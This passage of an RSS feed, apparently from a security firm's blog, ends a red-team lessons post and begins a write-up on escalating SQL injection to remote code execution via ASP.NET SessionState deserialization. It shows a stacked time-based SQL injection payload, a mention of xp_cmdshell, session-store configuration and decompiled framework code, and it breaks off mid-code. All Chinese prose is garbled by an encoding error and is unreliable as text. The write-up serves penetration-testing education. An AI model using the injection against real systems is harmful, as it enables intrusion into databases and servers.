      &lt;li&gt;ç³»çµ±å¾æœªé€²è¡Œé«˜å¼·åº¦çš„æ»²é€æ¸¬è©¦åŠå®šæœŸåŸ·è¡Œå¼±é»æƒæ&lt;/li&gt;
      &lt;li&gt;å±¬æ–¼è€èˆŠç„¡æ³•ä¿®è£œçš„ç³»çµ±ï¼ˆä½¿ç”¨è€èˆŠçš„æ¡†æ¶ã€ç¨‹å¼èªè¨€ï¼‰æˆ–æ˜¯å» å•†å·²ç¶“ä¸å†ç¶­è­·&lt;/li&gt;
      &lt;li&gt;ä¸€æ¬¡æ€§çš„æ´»å‹•ç¶²ç«™æˆ–æ¸¬è©¦ç¶²ç«™ï¼Œæ´»å‹•æˆ–æ¸¬è©¦çµæŸå¾Œæœªä¾ç…§ç¨‹åºä¸‹ç·šï¼Œæˆç‚ºä¼æ¥­é˜²ç¦¦ç ´å£&lt;/li&gt;
      &lt;li&gt;ä¸åœ¨ä¼æ¥­ç›¤é»çš„é˜²è­·ç¯„åœå…§ï¼ˆå¦‚å‰ç«¯æœªè¨­ç½® WAFï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å¾å“¡å·¥é›»è…¦æˆ–æ˜¯ Web ä¼ºæœå™¨å¯ä»¥é€æ­¥è·³åˆ° AD ä¼ºæœå™¨&lt;/strong&gt;ï¼Œå¯èƒ½å­˜åœ¨çš„å•é¡Œå‰‡åŒ…å«ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç¶²è·¯é–“çš„å€éš”ä¸åš´è¬¹ï¼Œä¾‹å¦‚æœªä¾ç…§è³‡æ–™æˆ–ç³»çµ±çš„é‡è¦æ€§é€²è¡Œå€éš”&lt;/li&gt;
      &lt;li&gt;åŒç¶²æ®µä¼ºæœå™¨é–“çš„é€šè¨Šæ–¹å¼ç®¡æ§ä¸ç•¶ï¼Œæ²’æœ‰é–‹å•Ÿæˆ–ç®¡åˆ¶é‡è¦ä¼ºæœå™¨çš„é€šè¨ŠåŸ æˆ–é™åˆ¶ä¾†æº IP ä½å€&lt;/li&gt;
      &lt;li&gt;ç³»çµ±å­˜åœ¨å¯åˆ©ç”¨å–å¾—æ¬Šé™çš„å¼±é»&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;åˆ©ç”¨å‡Œæ™¨æ™‚æ®µç«„æ”¹ç¾¤çµ„æ´¾é€åŸå‰‡&lt;/strong&gt;ï¼šæœ€å¾Œæ˜¯å›æ‡‰æ©Ÿåˆ¶æœªå³æ™‚ï¼ˆåŒ…å«äººå“¡æ¥ç²å‘Šè­¦å¾Œè™•ç†ä¸ç•¶ï¼‰ï¼Œä¼æ¥­å°æ–¼å…·æœ‰é›†ä¸­ç®¡ç†æ¬Šé™çš„é‡è¦ç³»çµ±ï¼Œä¾‹å¦‚ AD Serverã€è³‡ç”¢ç®¡ç†è»Ÿé«”ç­‰é€™é¡å‹çš„ä¸»æ©Ÿï¼Œé™¤äº†å°ç‰¹æ¬Šå¸³è™Ÿé«˜å¼·åº¦çš„ç®¡ç†å¤–ï¼ˆå¦‚ OTPï¼‰ï¼Œä¹Ÿæ‡‰è©²é‡å°ã€Œç•°å¸¸å¸³è™Ÿç™»å…¥ã€ã€ã€Œç•°å¸¸å¸³è™Ÿæ–°å¢åˆ°ç¾¤çµ„ã€ã€ã€Œæ­£å¸¸å¸³è™Ÿç•°å¸¸ç™»å…¥æ™‚é–“ã€ã€ã€Œæ–°å¢æ’ç¨‹æˆ– GPOã€ç­‰è¡Œç‚ºç™¼å‡ºå‘Šè­¦ï¼›è€Œå„ç¨®å‘Šè­¦ä¹Ÿæ‡‰è©²ä¾ç…§è³‡ç”¢çš„é‡è¦æ€§è¨‚å®šä¸åŒçš„ SLA å›æ‡‰èˆ‡è™•ç†ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ä½ éœ€è¦æ›´å…¨é¢ç›®æ¨™å°å‘çš„æ–¹å¼æ€è€ƒä¼æ¥­è³‡å®‰ç¾æ³&quot;&gt;ä½ éœ€è¦æ›´å…¨é¢ã€ç›®æ¨™å°å‘çš„æ–¹å¼æ€è€ƒä¼æ¥­è³‡å®‰ç¾æ³&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘åœ¨è¿‘ä¸‰å¹´çš„ç´…éšŠæ¼”ç·´ï¼Œä»¥ä¼æ¥­å°å…¶ç‡Ÿé‹æœ€é—œéµçš„è³‡è¨Šè³‡ç”¢ä½œç‚ºæ¼”ç·´æ¨™çš„ï¼Œä¸¦æ¨¡æ“¬çµ„ç¹”å‹é§­å®¢çš„æ”»æ“Šæ¨¡å¼ï¼Œé€éå¤–éƒ¨æƒ…æœã€å–å¾—å¤–éƒ¨ç³»çµ±æ¬Šé™ã€æ©«å‘ç§»å‹•ã€æŒçºŒå–å¾—æ›´å¤šå…§éƒ¨ä¼ºæœå™¨æ¬Šé™åŠææ¬Šã€ç ´è§£å¯†ç¢¼ï¼Œæœ€çµ‚é”åˆ°ä¼æ¥­æŒ‡å®šçš„é—œéµè³‡ç”¢åŸ·è¡Œæ¼”ç·´æƒ…å¢ƒã€‚è€Œä¼æ¥­é€éé«˜å¼·åº¦ä¸”ç²¾æº–çš„æ¼”ç·´éç¨‹ï¼Œé™¤äº†æ˜ç¢ºæŒæ¡å¯è¢«å…¥ä¾µçš„è·¯å¾‘å¤–ï¼Œæ›´å¾—ä»¥æª¢è¦–ä¸Šè¿°å•é¡Œçš„ä¸è¶³ä¸¦æŒçºŒæ”¹å–„ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘èªç‚ºï¼Œåªè¦ä½ çš„ä¼æ¥­å¤ é‡è¦ï¼ˆå°é§­å®¢è€Œè¨€é‡è¦ï¼Œè€Œä¸æ˜¯è‡ªå·±è¦ºå¾—é‡è¦ï¼‰ï¼Œçµ„ç¹”å‹çš„æ”»æ“Šå°±ä¸æœƒåœæ­‡ï¼ä¼æ¥­å”¯æœ‰ä¸æ–·çš„æ‰¾å‡ºè‡ªå·±ä¸è¶³ä¹‹è™•ï¼ŒæŒçºŒæå‡è‡ªå·±çš„é˜²ç¦¦å¼·åº¦æ‰æ˜¯èƒ½çœŸæ­£é™ä½é¢¨éšªçš„æ­£ç¢ºä½œæ³•ã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼ã€Œç¬¬ä¸‰æ–¹ä¾›æ‡‰éˆå®‰å…¨ã€åŠã€Œå¦‚ä½•æ›´å®Œæ•´çš„åˆ¶å®šè³‡å®‰ç­–ç•¥ã€ï¼Œæˆ‘å€‘å°‡æ‰¾æ™‚é–“å¦å¤–è·Ÿå¤§å®¶èªªæ˜ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers/</link>
                <guid>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers</guid>
                <pubDate>Fri, 21 Aug 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¾ SQL åˆ° RCE: åˆ©ç”¨ SessionState ååºåˆ—åŒ–æ”»æ“Š ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼</title>
                <description>&lt;p&gt;ä»Šæ—¥ä¾†èŠèŠåœ¨å»å¹´æŸæ¬¡æ»²é€æ¸¬è©¦éä¸­ç™¼ç¾çš„è¶£äº‹ï¼Œé‚£æ˜¯åœ¨ä¸€å€‹é¢¨å’Œæ—¥éº—çš„ä¸‹åˆï¼Œèˆ‡å¾€å¸¸ä¸€æ¨£é€²è¡Œè‘—æ¯ç‡¥çš„æ¸¬è©¦ç’°ç¯€ï¼Œå°æ¯å€‹åƒæ•¸å˜—è©¦å„ç¨®å¯èƒ½çš„æ³¨å…¥ï¼Œä½†é²é²æ²’æœ‰ä»»ä½•é€²å±•å’Œçªç ´ï¼Œç›´åˆ°åœ¨æŸå€‹é é¢ä¸Šæ³¨å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1; waitfor delay &apos;00:00:05&apos;--&lt;/code&gt;ï¼Œç„¶å¾Œä»–å°±å¡ä½äº†ï¼Œéäº†æ°å¥½ 5 ç§’é˜å¾Œä¼ºæœå™¨åˆæœ‰å›æ‡‰ï¼Œé€™è¡¨ç¤ºæˆ‘å€‘æ‰¾åˆ°ä¸€å€‹ SQL Server ä¸Šçš„ SQL Injectionï¼&lt;/p&gt;

&lt;p&gt;ä¸€äº›é™³èˆŠã€é¾å¤§çš„ç³»çµ±ä¸­ï¼Œå› ç‚ºä¸€äº›è¤‡é›œçš„å› ç´ ï¼Œå¾€å¾€ä»ä½¿ç”¨è‘— sa å¸³æˆ¶ä¾†ç™»å…¥ SQL Serverï¼Œè€Œåœ¨æœ‰å¦‚æ­¤é«˜æ¬Šé™çš„è³‡æ–™åº«å¸³æˆ¶å‰æä¸‹ï¼Œæˆ‘å€‘å¯ä»¥è¼•æ˜“åˆ©ç”¨ xp_cmdshell ä¾†åŸ·è¡Œç³»çµ±æŒ‡ä»¤ä»¥å–å¾—è³‡æ–™åº«ä¼ºæœå™¨çš„ä½œæ¥­ç³»çµ±æ§åˆ¶æ¬Šï¼Œä½†å‡å¦‚æ•…äº‹æœ‰å¦‚æ­¤é †åˆ©ï¼Œå°±ä¸æœƒå‡ºç¾é€™ç¯‡æ–‡ç« ï¼Œæ‰€ä»¥ç†æ‰€ç•¶ç„¶æˆ‘å€‘å–å¾—çš„è³‡æ–™åº«å¸³æˆ¶ä¸¦æ²’æœ‰è¶³å¤ æ¬Šé™ã€‚ä½†å› ç‚ºç™¼ç¾çš„ SQL Injection æ˜¯ Stacked basedï¼Œæˆ‘å€‘ä»ç„¶å¯ä»¥å°è³‡æ–™è¡¨åš CRUDï¼Œé‹æ°£å¥½æ§åˆ¶åˆ°ä¸€äº›ç¶²ç«™è¨­å®šè®Šæ•¸çš„è©±ï¼Œç”šè‡³å¯ä»¥ç›´æ¥é”æˆ RCEï¼Œæ‰€ä»¥é‚„æ˜¯è©¦è‘— dump schema ä»¥äº†è§£æ¶æ§‹ï¼Œè€Œåœ¨ dump éç¨‹ä¸­ç™¼ç¾äº†ä¸€å€‹æœ‰è¶£çš„è³‡æ–™åº«ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: ASPState
[2 tables]
+---------------------------------------+
| dbo.ASPStateTempApplications          |
| dbo.ASPStateTempSessions              |
+---------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é–±è®€æ–‡ä»¶å¾Œäº†è§£åˆ°ï¼Œé€™å€‹è³‡æ–™åº«çš„å­˜åœ¨ç”¨é€”æ˜¯ç”¨ä¾†ä¿å­˜ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼çš„ sessionã€‚ä¸€èˆ¬æƒ…æ³ä¸‹é è¨­ session æ˜¯å„²å­˜åœ¨ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼çš„è¨˜æ†¶é«”ä¸­ï¼Œä½†æŸäº›åˆ†æ•£å¼æ¶æ§‹ï¼ˆä¾‹å¦‚ Load Balance æ¶æ§‹ï¼‰çš„æƒ…æ³ä¸‹ï¼ŒåŒæ™‚æœƒæœ‰å¤šå€‹ä¸€æ¨¡ä¸€æ¨£çš„ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼é‹è¡Œåœ¨ä¸åŒä¼ºæœå™¨ä¸»æ©Ÿä¸Šï¼Œè€Œä½¿ç”¨è€…æ¯æ¬¡è«‹æ±‚æ™‚è¢«åˆ†é…åˆ°çš„ä¼ºæœå™¨ä¸»æ©Ÿä¹Ÿä¸æœƒå®Œå…¨ä¸€è‡´ï¼Œå°±æœƒéœ€è¦æœ‰å¯ä»¥è®“å¤šå€‹ä¸»æ©Ÿå…±äº« session çš„æ©Ÿåˆ¶ï¼Œè€Œå„²å­˜åœ¨ SQL Server ä¸Šå°±æ˜¯ä¸€ç¨®è§£æ±ºæ–¹æ¡ˆä¹‹ä¸€ï¼Œæƒ³å•Ÿç”¨é€™å€‹æ©Ÿåˆ¶å¯ä»¥åœ¨ web.config ä¸­æ·»åŠ å¦‚ä¸‹è¨­å®šï¼š&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.web&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- å°‡ session ä¿å­˜åœ¨ SQL Server ä¸­ã€‚ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;sessionState&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SQLServer&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;sqlConnectionString=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data source=127.0.0.1;user id=&amp;lt;username&amp;gt;;password=&amp;lt;password&amp;gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;timeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- é è¨­å€¼ï¼Œå°‡ session ä¿å­˜åœ¨è¨˜æ†¶é«”ä¸­ã€‚ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;sessionState mode=&quot;InProc&quot; timeout=&quot;20&quot; /&amp;gt; --&amp;gt;&lt;/span&gt;
 
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- å°‡ session ä¿å­˜åœ¨ ASP.NET State Service ä¸­ï¼Œ
             å¦ä¸€ç¨®è·¨ä¸»æ©Ÿå…±äº« session çš„è§£æ±ºæ–¹æ¡ˆã€‚ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!--
        &amp;lt;sessionState
            mode=&quot;StateServer&quot;
            stateConnectionString=&quot;tcpip=localhost:42424&quot;
            timeout=&quot;20&quot;
        /&amp;gt;
        --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.web&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è€Œè¦åœ¨è³‡æ–™åº«ä¸­å»ºç«‹ ASPState çš„è³‡æ–™åº«ï¼Œå¯ä»¥åˆ©ç”¨å…§å»ºçš„å·¥å…· &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe&lt;/code&gt; å®Œæˆé€™å€‹ä»»å‹™ï¼Œåªéœ€è¦ä½¿ç”¨ä¸‹è¿°æŒ‡ä»¤å³å¯ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# å»ºç«‹ ASPState è³‡æ–™åº«&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssadd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p

&lt;span class=&quot;c&quot;&gt;# ç§»é™¤ ASPState è³‡æ–™åº«&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssremove&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç¾åœ¨æˆ‘å€‘äº†è§£å¦‚ä½•è¨­å®š session çš„å„²å­˜ä½ç½®ï¼Œä¸”åˆå¯ä»¥æ§åˆ¶ ASPState è³‡æ–™åº«ï¼Œå¯ä»¥åšåˆ°äº›ä»€éº¼å‘¢ï¼Ÿé€™å°±æ˜¯æ–‡ç« æ¨™é¡Œçš„é‡é»ï¼Œå–å¾— Remote Code Executionï¼&lt;/p&gt;

&lt;p&gt;ASP.NET å…è¨±æˆ‘å€‘åœ¨ session ä¸­å„²å­˜ä¸€äº›ç‰©ä»¶ï¼Œä¾‹å¦‚å„²å­˜ä¸€å€‹ List ç‰©ä»¶ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Session[&quot;secret&quot;] = new List&amp;lt;String&amp;gt;() { &quot;secret string&quot; };&lt;/code&gt;ï¼Œå°æ–¼å¦‚ä½•å°‡é€™äº›ç‰©ä»¶ä¿å­˜åˆ° SQL Server ä¸Šï¼Œç†æ‰€ç•¶ç„¶åœ°ä½¿ç”¨äº†&lt;strong&gt;åºåˆ—åŒ–æ©Ÿåˆ¶&lt;/strong&gt;ä¾†è™•ç†ï¼Œè€Œæˆ‘å€‘åˆæ§åˆ¶äº†è³‡æ–™åº«ï¼Œæ‰€ä»¥ä¹Ÿèƒ½åŸ·è¡Œä»»æ„ååºåˆ—åŒ–ï¼Œç‚ºæ­¤éœ€è¦å…ˆäº†è§£ Session ç‰©ä»¶åºåˆ—åŒ–èˆ‡ååºåˆ—åŒ–çš„éç¨‹ã€‚&lt;/p&gt;

&lt;p&gt;ç°¡å–®é–±è®€ç¨‹å¼ç¢¼å¾Œï¼Œå¾ˆå¿«å°±å¯ä»¥å®šä½å‡ºè™•ç†ç›¸é—œéç¨‹çš„é¡åˆ¥ï¼Œç‚ºäº†ç¸®æ¸›èªªæ˜çš„ç¯‡å¹…ï¼Œä»¥ä¸‹å°‡ç›´æ¥åˆ‡å…¥é‡é»èªªæ˜å¾è³‡æ–™åº«å–å‡ºè³‡æ–™å¾Œé€²è¡Œäº†ä»€éº¼æ¨£çš„ååºåˆ—åŒ–æ“ä½œã€‚æ ¸å¿ƒä¸»è¦æ˜¯é€éå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SqlSessionStateStore.GetItem&lt;/code&gt; å‡½å¼é‚„åŸå‡º Session ç‰©ä»¶ï¼Œé›–ç„¶å·²ç›¡å¯èƒ½æŠŠç„¡é—œç·Šè¦çš„ç¨‹å¼ç¢¼ç§»é™¤ï¼Œä½†è¡Œæ•¸é‚„æ˜¯åå¤šï¼Œå¦‚æœæ‡¶å¾—é–±è®€ç¨‹å¼ç¢¼çš„æœ‹å‹å¯ä»¥ç›´æ¥ä¸‹æ‹‰ç¹¼çºŒçœ‹æ–‡ç« èªªæ˜ XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlSessionStateStore&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreProviderBase&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;GetItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionIDManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CheckIdLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* throwOnFail */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlDataReader&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;MemoryStream&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlStateConnection&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
